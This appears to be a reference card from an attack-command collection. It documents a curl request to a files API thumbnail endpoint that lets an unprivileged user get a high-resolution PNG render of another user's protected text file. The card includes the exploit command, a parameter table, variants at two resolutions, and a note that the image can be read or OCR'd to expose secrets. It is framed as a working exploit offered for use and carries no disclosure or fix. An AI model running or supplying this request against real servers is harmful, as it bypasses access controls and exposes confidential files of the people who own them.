# thumbnail-text-curl

## Command

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/4096/4096/Secret_Folder/Secret_Subfolder/Secret_Text.txt' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Text.png
```

## Description

This command retrieves a PNG preview render of a protected text file via the files API as an unprivileged user, exploiting cached thumbnails generated by the owner to expose sensitive text as an image.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Username for auth | Yes |
| URL | API endpoint with high width/height and text file path | Yes |
| `-H` | Content-Type header | Yes |
| `>` | Output to PNG file | Yes |

## Examples

### Basic Usage

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/4096/4096/path/to/text.txt' -H 'Content-Type: application/x-www-form-urlencoded' > text.png
```

### Advanced Usage

Lower resolution if needed: /thumbnail/1024/1024/...

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/1024/1024/Secret_Folder/text.txt' -H 'Content-Type: application/x-www-form-urlencoded' > preview.png
```

## Expected Output

Binary PNG file (Secret_Text.png) rendering the text file contents at high resolution, allowing OCR or direct reading of sensitive information.
